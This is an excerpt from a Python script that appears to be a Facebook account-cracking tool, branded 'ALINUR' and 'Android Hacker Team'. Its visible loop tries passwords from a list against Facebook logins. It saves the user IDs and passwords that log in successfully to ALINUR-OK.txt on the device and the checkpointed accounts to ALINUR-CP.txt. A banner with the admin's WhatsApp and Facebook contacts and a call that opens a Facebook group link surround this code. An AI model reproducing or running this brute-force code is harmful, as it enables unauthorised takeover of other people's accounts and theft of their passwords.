...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mALINUR   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0

         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923059361667
          \x1b[1;92m FACEBOOK:  \x1b[1;95mALINUR Tanha
\033[1;37m------------------------\033[1;37m------------------------ """
def ud():
...
ha = current.day
today = date.today()
os.system('xdg-https://facebook.com/groups/6365363663590557/')
logo = """
...
╚═════╝ ╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
 ...
 \033[1;95m=     \033[1;35m  ANDROID HACKER TEAM (AHT) FB GROUP .... \033[1;95m=
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[ALINUR-OK]  ' +cid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ALINUR-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;35m[ALINUR-CP]  ' +cid+ ' | ' +ps+      '  \33[0;97m')
                open('/sdcard/ALINUR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[BH-HaXor] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
